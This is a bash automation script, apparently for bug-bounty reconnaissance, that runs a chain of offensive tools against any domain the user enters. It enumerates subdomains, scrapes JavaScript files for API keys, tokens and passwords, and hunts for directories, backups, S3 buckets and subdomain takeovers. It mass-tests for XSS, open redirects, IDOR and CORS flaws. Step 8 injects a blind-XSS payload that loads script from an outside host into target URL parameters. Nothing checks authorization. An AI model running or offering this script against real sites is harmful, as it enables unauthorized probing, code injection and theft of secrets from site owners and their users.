#!/bin/bash

# Function to check required dependencies
function check_dependencies() {
    dependencies=("subfinder" "httpx-toolkit" "katana" "nuclei" "gf" "dirsearch" "sqlmap" "subzy" "python" "openredirex" "jq" "curl" "grep" "sed" "awk" "xargs" "bash" "wget" "waybackurls" "jsfinder" "Gxss" "dalfox" "ffuf" "s3scanner" "paramspider")
    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo "Error: $dep is not installed. Install it using apt, pip, or clone its repository."
            exit 1
        fi
    done
}

check_dependencies

# User inputs
read -p "Enter base domain name (e.g., example): " base_domain
read -p "Enter TLDs to scan (comma-separated, e.g., com,in,io): " tlds
read -p "Enter output directory: " output_dir

# Convert comma-separated TLDs to an array
IFS=',' read -r -a tld_array <<< "$tlds"

# Create output directory if it doesn’t exist
mkdir -p "$output_dir"
cd "$output_dir" || exit

# Generate list.txt with target URLs
echo "[+] Generating list.txt with target URLs..."
> list.txt  # Clear or create list.txt
for tld in "${tld_array[@]}"; do
    domain="https://${base_domain}.${tld}"
    echo "$domain" >> list.txt
done
echo "[+] list.txt generated with the following URLs:"
cat list.txt

# Function to enumerate subdomains across multiple TLDs
function enumerate_subdomains() {
    > subdomains_temp.txt  # Clear temp file
    for tld in "${tld_array[@]}"; do
        domain="${base_domain}.${tld}"
        echo "[+] Running Subfinder for $domain..."
        subfinder -d "$domain" -all -recursive >> subdomains_temp.txt

        echo "[+] Collecting subdomains from crt.sh for $domain..."
        curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> subdomains_temp.txt

        echo "[+] Collecting subdomains from ThreatMiner for $domain..."
        curl -s "https://api.threatminer.org/v2/domain.php?q=$domain&rt=5" | jq -r '.results[]' | grep -o "\w.*$domain" | sort -u >> subdomains_temp.txt
    done

    # Combine and remove duplicates
    sort -u subdomains_temp.txt > subdomains.txt
    rm subdomains_temp.txt
}

# Step 1: Subdomain enumeration
enumerate_subdomains

# Step 2: Filter live subdomains
echo "[+] Checking live subdomains with httpx..."
cat subdomains.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 -silent > subdomains_alive.txt

# Step 3: URL enumeration with Katana and waybackurls
echo "[+] Extracting URLs with Katana and waybackurls..."

# Use Katana for live subdomains
echo "[+] Running Katana on live subdomains..."
katana -u subdomains_alive.txt -d 5 -kf -jc -fx -ef woff,css,png,jpg,woff2,jpeg,gif,svg -o katana_urls.txt

# Use waybackurls for historical URLs across all TLDs
echo "[+] Running waybackurls for historical URLs..."
> waybackurls_urls_temp.txt
for tld in "${tld_array[@]}"; do
    domain="${base_domain}.${tld}"
    echo "$domain" | waybackurls >> waybackurls_urls_temp.txt
done
sort -u waybackurls_urls_temp.txt > waybackurls_urls.txt
rm waybackurls_urls_temp.txt

# Combine Katana and waybackurls outputs
cat katana_urls.txt waybackurls_urls.txt | sort -u > allurls.txt
echo "[+] Combined URLs saved to 'allurls.txt'."

# Step 4: Extract JavaScript files
echo "[+] Extracting JS files..."
grep -E "\.js$" allurls.txt > js.txt

# Step 4.1: Run jsfinder on list.txt
echo "[+] Running jsfinder on list.txt..."
cat list.txt | jsfinder -read -s -o js.txt

# Step 4.2: JS secrets scan
echo "[*] JS secrets scan..."
cat allurls.txt | grep "\.js$" | httpx-toolkit -mc 200 -content-type | grep -E "application/javascript|text/javascript" \
  | cut -d' ' -f1 | xargs -I% curl -s % | grep -E "(API_KEY|api_key|apikey|secret|token|password)" > js_secrets.txt

# Step 4.3: DOM XSS in JS files
echo "[*] DOM XSS in JS files..."
cat allurls.txt | grep "\.js$" | Gxss -c 100 | sort -u | dalfox pipe -o dom_xss_results.txt

# Step 5: Nuclei scan for exposures
echo "[+] Running Nuclei scans for JS files..."
nuclei -list js.txt -t ~/nuclei-templates/http/exposures/ -c 30

# Step 6: Sensitive file search
echo "[+]
Searching for sensitive files..."
grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|_config" allurls.txt > sensitive_files.txt



# Step 8: Automated XSS scanning
echo "[+] Running automated XSS scans..."
cat subdomains_alive.txt | katana -ps -f qurl | gf xss | bxss -appendMode -payload "<script src=https://xss.report/c/coffinxp></script>"

# Step 9: Subdomain takeover checks
echo "[+] Checking for subdomain takeovers..."
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl --output subdomain_takeovers.txt

#mODIFIED Step

echo "[+] Checking for IDOR above urls......"
cat katana_urls.txt allurls.txt waybackurls_urls.txt | sort -u > idor_urls.txt
echo "IDOR_URLS.txt file saved"
cat idor_urls.txt | grep -E "\?id=|\?user=|\?account=" > param_urls.txt
paramspider -l idor_urls.txt
nuclei -l idor_urls.txt -tags idor -no-mhe 
nuclei -l idor_urls.txt -t /home/kali/Desktop/nuclei-temp-custom/nuclei-templates/idor.yaml -no-mhe 

###########################

#Cheching Openredirect

echo "[+] Checking for Openredirect "

# Filter URLs with redirect-related parameters
cat idor_urls.txt | grep -Ei "\?(url|redirect|next|goto|return|dest|continue|path)=" > redirect_urls.txt

# Test for open redirects with curl and highlight vulnerable URLs in green
while read -r url; do
  test_url=$(echo "$url" | sed -E 's/=[^&]*/=https%3A%2F%2Fgoogle.com/')
  echo "Testing: $test_url"
  
  # Perform curl request, capturing headers and status code
  response=$(curl -s -I -L -m 5 "$test_url" 2>/dev/null)
  status_code=$(echo "$response" | grep -E '^HTTP/' | tail -1 | awk '{print $2}')
  location=$(echo "$response" | grep -i "location:.*google\.com" | awk '{print $2}')

  # Check if response indicates a redirect (30x) and contains example.com in Location header
  if [[ "$status_code" =~ ^30[0-8] && -n "$location" ]]; then
    echo -e "\033[32mVulnerable: $test_url (Status: $status_code, Location: $location)\033[0m"
  else
    echo "Not Vulnerable: $test_url (Status: $status_code)"
  fi
done < redirect_urls.txt > open_redirect_results.txt

##################################

#Modifed Xss for automated from allurls.txt

echo "[+] Checking for xss using dalfox,xssvibes mxs" 

cat allurls.txt | grep -v 'js' | grep '=' | uro > xss.txt
echo "xss.txt file saved"
echo "MXS Started"
python3 /home/kali/Desktop/tools/MXS/MXS.py -i xss.txt -p ~/Desktop/tools/MXS/xsswaf.txt -c 1700 -t 15
echo "XSS_vibes Started"
python3 /home/kali/Desktop/tools/xss_vibes/main.py -f xss.txt --waf
echo "Dalfox Started"
cat xss.txt | dalfox pipe --output xss_results.txt --skip-bav --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"



# Step 10: CORS misconfiguration check
echo "[+] Checking for CORS misconfigurations..."
python3 /home/kali/Desktop/Corsy/corsy.py -i  subdomains_alive.txt
cat subdomains_alive.txt | nuclei -t /home/kali/nuclei-templates/http/vulnerabilities/ -no-mhe


nuclei -l subdomains_alive.txt -t /home/kali/Desktop/nuclei-temp-custom/nuclei-templates/ -no-mhe

nuclei -l subdomains_alive.txt -t /home/kali/Desktop/nuclei-temp-custom/Priv8-Nuclei-Templates/ -no-mhe


# Step 7: Directory brute-forcing
echo "[+] Running Dirsearch..."
for tld in "${tld_array[@]}"; do
    domain="${base_domain}.${tld}"
    dirsearch -u "https://$domain" -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,py,rb,php,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,lock,log,rar,old,sql,sql.gz,sql.zip,tar.gz,tar,bz2,txt,wadl,zip,log,xml,js,json -o dirsearch_results.txt
done

# Step 11: S3 Bucket Scanning
echo "[*] S3 Bucket Scanning..."
for tld in "${tld_array[@]}"; do
    domain="${base_domain}.${tld}"
    s3scanner -bucket-file  "$domain" -enumerate >> s3_buckets.txt
    
    
    
done

echo "[+] All tasks completed. Check the '$output_dir' directory for results."
